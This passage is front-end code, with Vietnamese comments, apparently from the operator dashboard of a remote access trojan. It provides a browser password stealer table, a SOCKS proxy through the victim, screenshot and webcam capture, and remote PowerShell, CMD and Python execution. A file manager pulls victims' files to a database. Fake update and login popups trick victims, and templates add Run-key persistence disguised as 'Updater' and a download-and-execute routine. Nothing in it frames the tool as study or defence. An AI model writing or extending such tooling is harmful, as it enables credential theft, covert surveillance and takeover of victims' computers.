            <button class="tool-btn sm" onclick="sendCommand(currentClient.id,'steal_passwords')">▷ RUN MODULE</button>
          </div>
          <div class="overflow-table">
          <table class="stealer-table">
            <thead><tr><th>URL</th><th>USERNAME</th><th>PASSWORD</th><th>BROWSER</th></tr></thead>
            <tbody id="stealerBody">
              <tr><td colspan="4" class="empty-state">[ NO DATA — RUN MODULE ON TARGET ]</td></tr>
            </tbody>
          </table>
          </div>
        </div>
      </div>`;

  // ── PROXY ──
  } else if (tabId==='proxy') {
    content.innerHTML = `
      <div class="tab-pane active">
        <div class="section-title" style="margin-bottom:16px;"><span class="bracket">&gt;</span> SOCKS_PROXY</div>
        <div class="proxy-status">
          <span class="dot away" id="proxyDot"></span>
          <span id="proxyStatusText" style="color:#555;">INACTIVE</span>
        </div>
        <div class="proxy-form">
          <div class="proxy-row">
            <span class="proxy-label">TYPE</span>
            <select class="proxy-select" id="proxyType">
              <option>SOCKS5</option><option>SOCKS4</option><option>HTTP</option>
            </select>
          </div>
          <div class="proxy-row">
            <span class="proxy-label">LISTEN PORT</span>
            <input class="proxy-input" id="proxyPort" value="1080" placeholder="1080" />
          </div>
          <div class="proxy-row">
            <span class="proxy-label">USERNAME</span>
            <input class="proxy-input" id="proxyUser" placeholder="optional" />
          </div>
          <div class="proxy-row">
            <span class="proxy-label">PASSWORD</span>
            <input class="proxy-input" type="password" id="proxyPass" placeholder="optional" />
          </div>
          <div class="proxy-row" style="margin-top:4px;">
            <span class="proxy-label"></span>
            <div style="display:flex;gap:8px;">
              <button class="connect-btn" onclick="startProxy()">▷ START PROXY</button>
              <button class="tool-btn lg" onclick="stopProxy()">■ STOP</button>
            </div>
          </div>
        </div>
        <div class="proxy-chain" id="proxyChain">
          <div class="proxy-chain-title">PROXY CHAIN</div>
          <div class="chain-entry"><span class="chain-num">01</span><span class="chain-ip">${escapeHtml(currentClient.ip)} (this client)</span><span class="chain-status dot on"></span></div>
          <div class="chain-entry"><span class="chain-num">02</span><span class="chain-ip">—</span><span class="chain-status dot away"></span></div>
        </div>
      </div>`;

  // ── ROLL / SCREENSHOTS ──
  } else if (tabId==='roll') {
    content.innerHTML = `
      <div class="tab-pane active">
        <div class="sec-head">
          <div class="section-title"><span class="bracket">&gt;</span> SCREENSHOTS</div>
          <div style="display:flex;gap:8px;">
            <button class="tool-btn sm" onclick="captureScreen()">📷 Capture</button>
            <button class="tool-btn sm" onclick="renderTabContent('roll')">↻</button>
          </div>
        </div>
        <div class="roll-grid" id="rollGrid">
          <div class="roll-item">
            <div class="roll-thumb"><span class="roll-placeholder">🖥</span></div>
            <div class="roll-meta">
              <div style="color:#777;font-size:10px;">Waiting for capture...</div>
              <div class="roll-time">—</div>
            </div>
          </div>
          <div class="roll-item">
            <div class="roll-thumb"><span class="roll-placeholder">🖥</span></div>
            <div class="roll-meta">
              <div style="color:#555;font-size:10px;">No data</div>
              <div class="roll-time">—</div>
            </div>
          </div>
        </div>
        <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap;">
          <button class="tool-btn" onclick="sendCommand(currentClient.id,'screenshot_hd')">▷ HD Screenshot</button>
          <button class="tool-btn" onclick="sendCommand(currentClient.id,'screenshot_all_monitors')">▷ All Monitors</button>
          <button class="tool-btn" onclick="setAutoCapture()">⏱ Auto (30s)</button>
        </div>
      </div>`;

  // ── CODE ──
  } else if (tabId==='code') {
    content.innerHTML = `
      <div class="tab-pane active">
        <div class="section-title" style="margin-bottom:14px;"><span class="bracket">&gt;</span> CODE_EXEC</div>
        <div class="code-wrap">
          <div class="code-toolbar">
            <select class="code-lang-sel" id="codeLang">
              <option value="powershell">PowerShell</option>
              <option value="cmd">CMD (Batch)</option>
              <option value="vbs">VBScript</option>
              <option value="python">Python</option>
            </select>
            <div style="display:flex;gap:8px;">
              <button class="tool-btn" onclick="clearCode()">✕ Clear</button>
              <button class="connect-btn" onclick="execCode()">▷ Execute</button>
            </div>
          </div>
          <textarea class="code-editor" id="codeEditor" placeholder="// Enter code to execute on remote host...
// Example (PowerShell):
Get-Process | Select-Object Name, CPU | Sort-Object CPU -Desc | Select-Object -First 10" spellcheck="false"></textarea>
          <div class="section-title" style="font-size:11px;margin-bottom:6px;"><span class="bracket">&gt;</span> OUTPUT</div>
          <div class="code-output" id="codeOutput">// Output will appear here after execution...</div>
          <div class="remote-tools" style="margin-top:8px;">
            <button class="tool-btn sm" onclick="loadTemplate('screenshot')">📷 Screenshot</button>
            <button class="tool-btn sm" onclick="loadTemplate('persist')">🔗 Persistence</button>
            <button class="tool-btn sm" onclick="loadTemplate('sysinfo')">ℹ Sysinfo</button>
            <button class="tool-btn sm" onclick="loadTemplate('download')">⬇ Downloader</button>
          </div>
        </div>
      </div>`;

  // ── COMMS ──
  } else if (tabId==='comms') {
    content.innerHTML = `
      <div class="tab-pane active">
        <div class="section-title" style="margin-bottom:14px;"><span class="bracket">&gt;</span> COMMUNICATIONS</div>
        <div class="comms-wrap">
          <div class="comms-msgs" id="commsBox">
            <div class="comms-msg comms-msg-admin">
              <div class="comms-msg-time">${new Date().toLocaleTimeString('vi-VN')}</div>
              <span style="color:var(--accent);">[ADMIN]</span> Session opened for client ${escapeHtml(currentClient.id)}
            </div>
          </div>
          <div class="comms-input-row">
            <input type="text" class="comms-input" id="commsInput" placeholder="Type message to send to client..." onkeydown="if(event.key==='Enter')sendMsg()" />
            <button class="tool-btn" onclick="sendMsg()">SEND</button>
          </div>
        </div>
        <div class="comms-actions">
          <button class="tool-btn" onclick="sendNotify('You have a Windows update pending. Please restart.')">⚠ Fake Update Popup</button>
          <button class="tool-btn" onclick="sendNotify('Your session has expired. Please login again.')">🔒 Fake Login</button>
          <button class="tool-btn" onclick="sendAudio()">🔊 Play Sound</button>
          <button class="tool-btn" onclick="flipScreen()">↕ Flip Screen</button>
        </div>
      </div>`;

  // ── TASKS ──
  } else if (tabId==='tasks') {
    content.innerHTML = `
      <div class="tab-pane active">
        <div class="sec-head">
          <div class="section-title"><span class="bracket">&gt;</span> TASK_MANAGER</div>
          <div style="display:flex;gap:6px;">
            <button class="tool-btn sm" onclick="loadTaskList()">↻ Refresh</button>
            <button class="tool-btn sm" onclick="sendCommand(currentClient.id,'tasklist')">▷ Fetch Live</button>
          </div>
        </div>
        <div style="margin-bottom:10px;display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
          <input type="text" style="background:rgba(0,0,0,.4);border:1px solid #1a1a2e;color:#ccc;font-family:inherit;font-size:11px;padding:5px 10px;outline:none;flex:1;min-width:120px;" placeholder="Filter processes..." id="taskFilter" oninput="filterTasks()" />
          <button class="tool-btn sm" onclick="sendCommand(currentClient.id,'taskkill /f /pid '+prompt('Enter PID:'))">✕ Kill PID</button>
        </div>
        <div class="task-list" id="taskList">
          <div class="loading-state">[ CLICK REFRESH TO LOAD RUNNING PROCESSES ]</div>
        </div>
      </div>`;

  // ── FILES ──
  } else if (tabId==='files') {
    content.innerHTML = `
      <div class="tab-pane active">
        <div class="section-title" style="margin-bottom:12px;"><span class="bracket">&gt;</span> FILE_MANAGER</div>
        <div class="file-path-bar">
          <span class="file-path-icon">⊟</span>
          <input class="file-path-input" id="filePath" value="C:\\" onkeydown="if(event.key==='Enter')browseDir(this.value)" />
          <button class="tool-btn sm" onclick="browseDir(document.getElementById('filePath').value)">GO</button>
          <button class="tool-btn sm" onclick="goUp()">↑ UP</button>
        </div>
        <div class="task-bar">
          <div style="display:flex;gap:6px;flex-wrap:wrap;">
            <button class="tool-btn sm" id="btnNewFolder" onclick="toggleFmPanel('folder')">+ Folder</button>
            <button class="tool-btn sm" id="btnUpload"    onclick="toggleFmPanel('upload')">⬆ Upload</button>
            <button class="tool-btn sm" onclick="downloadSel()">⬇ Download</button>
            <button class="tool-btn sm warn" onclick="fmRunSel(false)">▷ Run</button>
            <button class="tool-btn sm warn" onclick="fmRunSel(true)">▷ RunAdmin</button>
            <button class="tool-btn sm danger" onclick="deleteSel()">✕ Delete</button>
          </div>
          <div style="display:flex;gap:6px;">
            <button class="tool-btn sm" onclick="toggleFmPanel('downloads')">📥 Files Đã Tải</button>
            <button class="tool-btn sm" onclick="browseDir(document.getElementById('filePath').value)">↻ Refresh</button>
          </div>
        </div>

        <!-- ── NEW FOLDER PANEL ── -->
        <div id="fm-folder-panel" class="fm-panel" style="display:none;">
          <span class="fm-panel-label">FOLDER NAME</span>
          <input id="fm-folder-name" class="fm-panel-input" type="text" placeholder="NewFolder" value="NewFolder"
                 onkeydown="if(event.key==='Enter')fmCreateFolder()" />
          <button class="tool-btn sm" onclick="fmCreateFolder()">OK</button>
          <button class="tool-btn sm danger" onclick="toggleFmPanel(null)">✕</button>
        </div>

        <!-- ── UPLOAD PANEL ── -->
        <div id="fm-upload-panel" class="fm-panel" style="display:none; flex-direction:column; gap:0; padding:0;">
          <div id="fm-upload-inner" style="display:flex;flex-direction:column;gap:8px;width:100%;padding:10px 12px;">
            <div style="display:flex;align-items:center;gap:8px;">
              <span class="fm-panel-label" style="flex-shrink:0;">FILE</span>
              <div id="fm-drop-zone"
                style="flex:1;min-width:0;border:1.5px dashed rgba(255,0,144,.35);border-radius:8px;padding:6px 14px;
                       background:rgba(255,0,144,.04);cursor:pointer;transition:all .2s;
                       display:flex;align-items:center;gap:8px;overflow:hidden;"
                onclick="document.getElementById('fm-file-input').click()"
                ondragover="fmDragOver(event)" ondragleave="fmDragLeave(event)" ondrop="fmDrop(event)">
                <span style="font-size:15px;">📂</span>
                <span id="fm-file-label" style="color:#666;font-size:11px;letter-spacing:1px;
                      white-space:nowrap;overflow:hidden;text-overflow:ellipsis;min-width:0;">
                  Choose file or drag & drop…
                </span>
                <span id="fm-file-size" style="color:#444;font-size:10px;flex-shrink:0;margin-left:auto;"></span>
              </div>
              <input id="fm-file-input" type="file" style="display:none" onchange="fmFileChosen(this)" />
              <button class="tool-btn sm" id="fm-upload-btn" onclick="fmUpload()" style="flex-shrink:0;">⬆ Upload</button>
              <button class="tool-btn sm danger" onclick="toggleFmPanel(null)" style="flex-shrink:0;">✕</button>
            </div>
            <!-- Progress bar (hidden until upload starts) -->
            <div id="fm-upload-progress-wrap" style="display:none;">
              <div style="display:flex;justify-content:space-between;margin-bottom:3px;">
                <span id="fm-upload-status-text" style="font-size:10px;letter-spacing:1px;color:#aaa;">PREPARING…</span>
                <span id="fm-upload-pct" style="font-size:10px;color:var(--accent);">0%</span>
              </div>
              <div style="height:4px;background:rgba(255,255,255,.06);border-radius:3px;overflow:hidden;">
                <div id="fm-upload-bar" style="height:100%;width:0%;background:var(--accent);
                     box-shadow:0 0 8px var(--glow);border-radius:3px;transition:width .3s;"></div>
              </div>
            </div>
          </div>
        </div>

        <!-- ── DOWNLOADS LIST PANEL ── -->
        <div id="fm-downloads-panel" class="fm-panel" style="display:none; flex-direction:column; gap:8px;">
          <div style="display:flex; justify-content:space-between; align-items:center;">
            <span class="fm-panel-label">DANH SÁCH FILE ĐÃ TẢI TỪ CLIENT VỀ DATABASE</span>
            <button class="tool-btn sm danger" onclick="toggleFmPanel(null)">✕ Close</button>
          </div>
          <div id="fm-downloads-list" style="max-height:200px; overflow-y:auto; font-size:12px;">
            [ Đang tải danh sách file... ]
          </div>
        </div>

        <div class="overflow-table">
        <table class="file-table" id="fileTable">
          <thead><tr>
            <th class="cb-th"><span class="fm-cb" id="fm-cb-all" title="Select all" onclick="fmToggleAll(this)"></span></th>
            <th>NAME</th><th>SIZE</th><th>MODIFIED</th>
          </tr></thead>
          <tbody id="fileBody">
            <tr><td colspan="5" class="loading-state">[ Initializing File Manager... ]</td></tr>
          </tbody>
        </table>
        </div>
      </div>`;
    browseDir('C:\\');

  // ── WEBCAM ──
  } else if (tabId==='webcam') {
    content.innerHTML = `
      <div class="tab-pane active">
        <div class="sec-head">
          <div class="section-title"><span class="bracket">&gt;</span> WEBCAM_CAPTURE</div>
          <span class="tag tag-away" id="camStatus">INACTIVE</span>
        </div>
        <div class="remote-screen" id="camScreen">
          <div class="scan-line"></div>
          <div class="remote-placeholder">
            <div class="remote-icon">📷</div>
            <div class="remote-label">CAMERA NOT ACTIVE</div>
            <div class="remote-sub">Requires agent with webcam support</div>
          </div>
        </div>
        <div class="remote-tools" style="margin-top:12px;">
          <button class="connect-btn" onclick="startWebcam()">▷ START STREAM</button>
          <button class="tool-btn lg" onclick="snapWebcam()">📷 SNAPSHOT</button>
          <button class="tool-btn lg" onclick="stopWebcam()">■ STOP</button>
        </div>
        <div style="margin-top:12px;">
          <div class="section-title" style="font-size:11px;margin-bottom:8px;"><span class="bracket">&gt;</span> OPTIONS</div>
          <div class="proxy-form">
            <div class="proxy-row">
              <span class="proxy-label">CAMERA</span>
              <select class="proxy-select"><option>Front Camera</option><option>Rear Camera</option><option>External</option></select>
            </div>
            <div class="proxy-row">
              <span class="proxy-label">QUALITY</span>
              <select class="proxy-select"><option>720p</option><option>480p</option><option>1080p</option></select>
            </div>
          </div>
        </div>
      </div>`;
  }
}

// ─── TERMINAL HELPERS ────────────────────────────────────
async function execCmd() {
  const input = document.getElementById('termInput');
  if(!input||!currentClient) return;
  const cmd = input.value.trim(); if(!cmd) return;
  input.value = '';
  const termOut = document.getElementById('termOut');
  if(termOut) { termOut.innerHTML += `\n<span style="color:var(--accent)">&gt; ${escapeHtml(cmd)}</span>\n<span style="color:#555">[queued...]</span>`; termOut.scrollTop=termOut.scrollHeight; }
  await sendCommand(currentClient.id, cmd);
  setTimeout(updateTerminalHistory, 1500);
}
function quickCmd(cmd) { const i=document.getElementById('termInput'); if(i){i.value=cmd;execCmd();} }

async function updateTerminalHistory() {
  if(!currentClient||activeTab!=='terminal') return;
  const termOut = document.getElementById('termOut');
  if(!termOut) return;
  const history = await loadCommandHistory(currentClient.id);
  if(!history||history.length===0){ termOut.innerHTML=`System ready. Type commands below.`; return; }
  termOut.innerHTML = history.reverse().map(h=>{
    const sc = h.status==='done'?'#00ffcc':(h.status==='error'?'#ff3333':'#ffaa00');
    return `<div class="term-line"><span style="color:var(--accent)">&gt; ${escapeHtml(h.command)}</span> <span style="color:${sc};font-size:10px;">[${h.status||'pending'}]</span></div><div style="color:#aaa;margin-bottom:8px;white-space:pre-wrap;">${escapeHtml(h.result||'[Waiting for agent...]')}</div>`;
  }).join('');
  termOut.scrollTop = termOut.scrollHeight;
}

// ─── CODE HELPERS ────────────────────────────────────────
function clearCode() { const e=document.getElementById('codeEditor');if(e)e.value=''; const o=document.getElementById('codeOutput');if(o)o.textContent='// Output cleared.'; }
async function execCode() {
  const code=document.getElementById('codeEditor')?.value?.trim();
  const lang=document.getElementById('codeLang')?.value;
  const out=document.getElementById('codeOutput');
  if(!code||!currentClient){if(out)out.textContent='// No code to execute.';return;}
  if(out)out.textContent='// Executing...';
  const cmd = lang==='powershell'?`powershell -EncodedCommand ${btoa(code)}`:(lang==='python'?`python -c "${code.replace(/"/g,'\\"')}"`:`cmd /c "${code}"`);
  await sendCommand(currentClient.id, cmd);
  if(out)out.textContent='// Command queued. Check terminal for output.';
}
const CODE_TEMPLATES = {
  screenshot: 'Add-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Screen]::AllScreens | ForEach-Object { Write-Host $_.DeviceName }',
  persist: 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "C:\\Path\\To\\agent.exe"',
  sysinfo: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Total Physical Memory"',
  download: '$url="http://example.com/file.exe";$out="C:\\Temp\\file.exe";Invoke-WebRequest $url -OutFile $out;Start-Process $out',
};
function loadTemplate(name) { const e=document.getElementById('codeEditor');const l=document.getElementById('codeLang');if(e&&CODE_TEMPLATES[name]){e.value=CODE_TEMPLATES[name];if(l&&name!=='download')l.value='powershell';} }

// ─── COMMS HELPERS ───────────────────────────────────────
async function sendMsg() {
  const inp=document.getElementById('commsInput');
  const box=document.getElementById('commsBox');
  if(!inp||!box) return;
  const msg = inp.value.trim(); if(!msg) return;
  inp.value='';
  box.innerHTML += `<div class="comms-msg"><div class="comms-msg-time">${new Date().toLocaleTimeString('vi-VN')}</div><span class="comms-msg-admin">[ADMIN → CLIENT]</span> ${escapeHtml(msg)}</div>`;
  box.scrollTop=box.scrollHeight;
  await sendCommand(currentClient.id, 'msgbox:'+msg);
}
function sendNotify(msg) { sendCommand(currentClient.id,'msgbox:'+msg); }
function sendAudio() { sendCommand(currentClient.id,'play_beep'); }
function flipScreen() { sendCommand(currentClient.id,'flip_screen'); }

// ─── TASK MGR ────────────────────────────────────────────
const DEMO_TASKS = [
  {pid:'4',    name:'System',                   cpu:'0.0%', mem:'0.1 MB'},
  {pid:'788',  name:'svchost.exe',               cpu:'0.1%', mem:'12.3 MB'},
  {pid:'1024', name:'explorer.exe',              cpu:'0.3%', mem:'48.2 MB'},
  {pid:'2048', name:'chrome.exe',                cpu:'1.2%', mem:'312.6 MB'},
  {pid:'3104', name:'discord.exe',               cpu:'0.4%', mem:'142.1 MB'},
  {pid:'4208', name:'csrss.exe',                 cpu:'0.0%', mem:'1.8 MB'},
  {pid:'5012', name:'SearchIndexer.exe',         cpu:'0.2%', mem:'24.5 MB'},
  {pid:'6120', name:'RuntimeBroker.exe',         cpu:'0.1%', mem:'8.7 MB'},
  {pid:'7200', name:'MsMpEng.exe (Defender)',    cpu:'0.8%', mem:'89.3 MB'},
  {pid:'8340', name:'python.exe',                cpu:'0.0%', mem:'16.2 MB'},
];
let taskData = [];
function loadTaskList() {
  const tl=document.getElementById('taskList');
  if(!tl) return;
  taskData = DEMO_TASKS;
  renderTasks(taskData);
}
function renderTasks(tasks) {
  const tl=document.getElementById('taskList');
  if(!tl) return;
  if(!tasks||tasks.length===0){tl.innerHTML=`<div class="empty-state">NO PROCESSES FOUND</div>`;return;}
  tl.innerHTML = tasks.map(t=>`
    <div class="task-item">
      <span class="task-cb" onclick="this.classList.toggle('checked')"></span>
      <span class="task-pid">${escapeHtml(t.pid)}</span>
      <span class="task-name" title="${escapeHtml(t.name)}">${escapeHtml(t.name)}</span>
      <span class="task-cpu">${escapeHtml(t.cpu)}</span>
      <span class="task-mem">${escapeHtml(t.mem)}</span>
    </div>`).join('');
}
function filterTasks() {
  const q=(document.getElementById('taskFilter')?.value||'').toLowerCase();
  renderTasks(!q?taskData:taskData.filter(t=>t.name.toLowerCase().includes(q)||t.pid.includes(q)));
}
async function killTask(pid) {
  if(!currentClient) return;
  await sendCommand(currentClient.id, 'taskkill /f /pid '+pid);
  taskData = taskData.filter(t=>t.pid!=String(pid));
  renderTasks(taskData);
}

// ─── FILES HELPERS ───────────────────────────────────────
let _fmPollTimer = null;

async function browseDir(path) {
  if (!currentClient) return;
  let targetPath = path || 'C:\\';
  targetPath = targetPath.trim().replace(/\//g, '\\');

  // Tự động thêm dấu \ nếu bị mất (vd: C:Windows -> C:\Windows)
  if (/^[A-Za-z]:[^\\]/.test(targetPath)) {
    targetPath = targetPath.substring(0, 2) + '\\' + targetPath.substring(2);
  }
  if (/^[A-Za-z]:$/.test(targetPath)) {
    targetPath += '\\';
  }

  const fp = document.getElementById('filePath');
  if (fp) fp.value = targetPath;

  const fb = document.getElementById('fileBody');
  if (fb) fb.innerHTML = `<tr><td colspan="4" class="loading-state">[ Sending xemfile+path+hwid to manager.php... ]</td></tr>`;

  try {
    // Gửi lệnh xemfile+path+hwid tới manager.php
    await fetch('manager.php?action=xemfile', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        client_id: currentClient.id,
        hwid: currentClient.hwid || '',
        path: targetPath
      })
    });
  } catch (e) {
    console.error('xemfile request error:', e);
  }

  // Đọc danh sách file từ Database và hiển thị
  await loadFilesFromDB(targetPath);

  // Poll cập nhật streaming mượt mà mỗi 1.5s (tối đa 12 lần thử ~ 18s)
  if (_fmPollTimer) clearInterval(_fmPollTimer);
  let pollCount = 0;
  _fmPollTimer = setInterval(async () => {
    pollCount++;
    if (activeTab === 'files' && currentClient && pollCount <= 12) {
      await loadFilesFromDB(targetPath, true);
    } else {
      clearInterval(_fmPollTimer);
      _fmPollTimer = null;
    }
  }, 1500);
}

async function loadFilesFromDB(path, silent = false) {
  if (!currentClient) return false;
  let targetPath = path || document.getElementById('filePath')?.value || 'C:\\';
  targetPath = targetPath.trim().replace(/\//g, '\\');
  if (/^[A-Za-z]:[^\\]/.test(targetPath)) {
    targetPath = targetPath.substring(0, 2) + '\\' + targetPath.substring(2);
  }
  if (/^[A-Za-z]:$/.test(targetPath)) {
    targetPath += '\\';
  }

  const fb = document.getElementById('fileBody');
  if (!fb) return false;

  if (!silent && fb.innerHTML.includes('loading-state')) {
    fb.innerHTML = `<tr><td colspan="4" class="loading-state">[ Loading files from Database... ]</td></tr>`;
  }

  try {
    const url = `manager.php?action=get_files&client_id=${encodeURIComponent(currentClient.id)}&hwid=${encodeURIComponent(currentClient.hwid || '')}&path=${encodeURIComponent(targetPath)}`;
    const res = await fetch(url);
    const json = await res.json();

    if (json.status === 'ok' && Array.isArray(json.data.files)) {
      const files = json.data.files;
      if (files.length === 0) {
        if (!silent || fb.innerHTML.includes('loading-state')) {
          fb.innerHTML = `<tr><td colspan="4" class="empty-state">[ LỆNH ĐÃ GỬI TỚI CLIENT — ĐANG CHỜ CLIENT.PY PHẢN HỒI DỮ LIỆU... ]</td></tr>`;
        }
        return false;
      }

      fb.innerHTML = files.map(f => {
        const isDir = f.type === 'dir';
        const icon = isDir ? '📁' : '📄';
        const nameClass = isDir ? 'dir-name' : 'file-name';
        const encPath = encodeURIComponent(f.path);
        const safeName = escapeHtml(f.name);

        return `<tr class="file-row" data-path="${encPath}" ${isDir ? `onclick="browseDir(decodeURIComponent('${encPath}'))"` : ''}>
          <td class="cb-td" onclick="event.stopPropagation(); fmToggleRow(this)"><span class="fm-cb"></span></td>
          <td class="${nameClass}">${icon} ${safeName}</td>
          <td>${escapeHtml(f.size || '—')}</td>
          <td style="font-size:10px;color:#777;">${escapeHtml(f.modified_at || '—')}</td>
        </tr>`;
      }).join('');
      return true;
    }
  } catch (e) {
    if (!silent) {
      fb.innerHTML = `<tr><td colspan="4" class="empty-state" style="color:#ff3333;">[ ERROR LOADING FILES FROM DB ]</td></tr>`;
    }
  }
  return false;
}

function goUp() {
  const fp = document.getElementById('filePath');
  if (!fp) return;
  let cur = fp.value.trim().replace(/\//g, '\\');
  if (cur.endsWith('\\') && cur.length > 3) cur = cur.slice(0, -1);
  const idx = cur.lastIndexOf('\\');
  if (idx > 0) {
    let parent = cur.substring(0, idx);
    if (parent.endsWith(':')) parent += '\\';
    browseDir(parent);
  } else {
    browseDir('C:\\');
  }
}

// ─── FILE MANAGER PANEL HELPERS ─────────────────────────
let _fmOpenPanel = null;
function toggleFmPanel(which) {
  const folderPanel    = document.getElementById('fm-folder-panel');
  const uploadPanel    = document.getElementById('fm-upload-panel');
  const downloadsPanel = document.getElementById('fm-downloads-panel');
  if (!folderPanel || !uploadPanel) return;
  // If clicking the already-open panel, close it
  if (_fmOpenPanel === which) which = null;
  folderPanel.style.display    = (which === 'folder') ? 'flex' : 'none';
  uploadPanel.style.display    = (which === 'upload') ? 'flex' : 'none';
  if (downloadsPanel) {
    downloadsPanel.style.display = (which === 'downloads') ? 'flex' : 'none';
  }
  _fmOpenPanel = which;
  // Focus the folder name input for convenience
  if (which === 'folder') {
    const inp = document.getElementById('fm-folder-name');
    if (inp) { inp.value = 'NewFolder'; inp.focus(); inp.select(); }
  } else if (which === 'downloads') {
    loadFmDownloadedFiles();
  }
}

async function loadFmDownloadedFiles() {
  const listEl = document.getElementById('fm-downloads-list');
  if (!listEl) return;
  if (!currentClient) {
    listEl.innerHTML = '<span style="color:#888;">[ Chưa chọn Client ]</span>';
    return;
  }
  listEl.innerHTML = '<span style="color:#aaa;">[ Đang tải danh sách file từ Database... ]</span>';
  try {
    const res = await fetch(`api.php?action=get_downloaded_files&client_id=${encodeURIComponent(currentClient.id)}`);
    const json = await res.json();
    if (json.status === 'ok' && Array.isArray(json.data) && json.data.length > 0) {
      let html = '<table style="width:100%; border-collapse:collapse;">';
      html += '<thead><tr style="text-align:left; border-bottom:1px solid #444;"><th>FILE NAME</th><th>PATH</th><th>CREATED AT</th><th>ACTION</th></tr></thead><tbody>';
      json.data.forEach(item => {
        html += `<tr style="border-bottom:1px solid #222;">
          <td style="padding:4px 0; font-weight:bold; color:var(--accent);">${escapeHtml(item.filename)}</td>
          <td style="padding:4px 0; color:#888;">${escapeHtml(item.filepath)}</td>
          <td style="padding:4px 0; color:#666;">${escapeHtml(item.created_at)}</td>
          <td style="padding:4px 0;">
            <a class="tool-btn sm" href="api.php?action=download_file&id=${item.id}" target="_blank" style="text-decoration:none; display:inline-block;">⬇ Tải về máy</a>
          </td>
        </tr>`;
      });
      html += 'tbody></table>';
      listEl.innerHTML = html;
    } else {
      listEl.innerHTML = '<span style="color:#888;">[ Chưa có file nào được tải về Database từ Client này ]</span>';
    }
  } catch (e) {
    console.error('Lỗi lấy danh sách file downloaded:', e);
    listEl.innerHTML = '<span style="color:#f55;">[ Lỗi tải danh sách file từ Database ]</span>';
  }
}

function downloadSel() {
  const paths = fmGetSelectedPaths();
  if (!paths.length) { alert('Select at least one file first.'); return; }
  paths.forEach(p => sendCommand(currentClient.id, 'getfile:' + p));
  alert(`Đã gửi ${paths.length} lệnh yêu cầu Client truyền file về Database!\n\nSau khi Client xử lý xong, nhấn nút [📥 Files Đã Tải] ở thanh công cụ để lưu trực tiếp về máy tính.`);
}

async function fmCreateFolder() {
  const name = (document.getElementById('fm-folder-name')?.value || '').trim();
  if (!name || !currentClient) return;
  const base = document.getElementById('filePath')?.value || 'C:\\';

  toggleFmPanel(null);

  const fb = document.getElementById('fileBody');
  if (fb) fb.innerHTML = `<tr><td colspan="4" class="loading-state">[ ĐANG GỬI LỆNH CHOFILENE TẠO THƯ MỤC '${escapeHtml(name)}'... ]</td></tr>`;

  try {
    const res = await fetch('manager.php?action=chofilene', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({
        foldername: name,
        path:       base,
        client_id:  currentClient.id,
        hwid:       currentClient.hwid || currentClient.id
      })
    });
    const json = await res.json();
    if (json.status === 'ok') {
      // Tự động làm mới thư mục để client.py stream và index.php vẽ dữ liệu mới ngay
      browseDir(base);
    } else {
      alert('Lỗi gửi lệnh tạo thư mục: ' + (json.message || 'Error'));
    }
  } catch (e) {
    console.error('Lỗi kết nối khi gửi lệnh chofilene:', e);
  }
}

// ─── FILE UPLOAD HELPERS ──────────────────────────────────────
let _fmSelectedFile = null;

function _fmFormatBytes(bytes) {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1048576) return (bytes/1024).toFixed(1) + ' KB';
  return (bytes/1048576).toFixed(2) + ' MB';
}

function fmFileChosen(input) {
  _fmSelectedFile = input.files[0] || null;
  const label = document.getElementById('fm-file-label');
  const sizeEl = document.getElementById('fm-file-size');
  if (label) label.textContent = _fmSelectedFile ? _fmSelectedFile.name : 'Choose file or drag & drop…';
  if (sizeEl) sizeEl.textContent = _fmSelectedFile ? _fmFormatBytes(_fmSelectedFile.size) : '';
  const drop = document.getElementById('fm-drop-zone');
  if (drop) drop.style.borderColor = _fmSelectedFile ? 'var(--accent)' : 'rgba(255,0,144,.35)';
}

function fmDragOver(e) {
  e.preventDefault();
  const drop = document.getElementById('fm-drop-zone');
  if (drop) { drop.style.borderColor='var(--accent)'; drop.style.background='rgba(255,0,144,.10)'; }
}
function fmDragLeave(e) {
  const drop = document.getElementById('fm-drop-zone');
  if (drop) { drop.style.borderColor='rgba(255,0,144,.35)'; drop.style.background='rgba(255,0,144,.04)'; }
}
function fmDrop(e) {
  e.preventDefault();
  fmDragLeave(e);
  const file = e.dataTransfer?.files?.[0];
  if (file) {
    _fmSelectedFile = file;
    const label = document.getElementById('fm-file-label');
    const sizeEl = document.getElementById('fm-file-size');
    if (label) label.textContent = file.name;
    if (sizeEl) sizeEl.textContent = _fmFormatBytes(file.size);
    const drop = document.getElementById('fm-drop-zone');
    if (drop) drop.style.borderColor = 'var(--accent)';
  }
}

function _fmUploadSetProgress(pct, statusText) {
  const wrap = document.getElementById('fm-upload-progress-wrap');
  const bar  = document.getElementById('fm-upload-bar');
  const pctEl= document.getElementById('fm-upload-pct');
  const stEl = document.getElementById('fm-upload-status-text');
  if (wrap) wrap.style.display = 'block';
  if (bar)  bar.style.width = pct + '%';
  if (pctEl)pctEl.textContent = pct + '%';
  if (stEl) stEl.textContent = statusText || '';
}
function _fmUploadReset() {
  const wrap = document.getElementById('fm-upload-progress-wrap');
  const bar  = document.getElementById('fm-upload-bar');
  const pctEl= document.getElementById('fm-upload-pct');
  const stEl = document.getElementById('fm-upload-status-text');
  if (wrap) wrap.style.display = 'none';
  if (bar)  bar.style.width = '0%';
  if (pctEl)pctEl.textContent = '0%';
  if (stEl) stEl.textContent = 'PREPARING…';
  _fmSelectedFile = null;
  const inp = document.getElementById('fm-file-input');
  if (inp) inp.value = '';
  const label = document.getElementById('fm-file-label');
  const sizeEl= document.getElementById('fm-file-size');
  if (label) label.textContent = 'Choose file or drag & drop…';
  if (sizeEl)sizeEl.textContent = '';
  const drop = document.getElementById('fm-drop-zone');
  if (drop) drop.style.borderColor = 'rgba(255,0,144,.35)';
}

function _fmToast(msg, isErr) {
  const t = document.createElement('div');
  t.style.cssText = `position:fixed;bottom:24px;right:24px;z-index:9999;padding:10px 18px;
    background:${isErr ? 'rgba(200,0,50,.95)' : 'rgba(0,180,80,.95)'};
    border:1px solid ${isErr ? '#f00' : '#0f0'};border-radius:8px;font-family:inherit;
    font-size:12px;letter-spacing:1px;color:#fff;box-shadow:0 4px 20px rgba(0,0,0,.5);
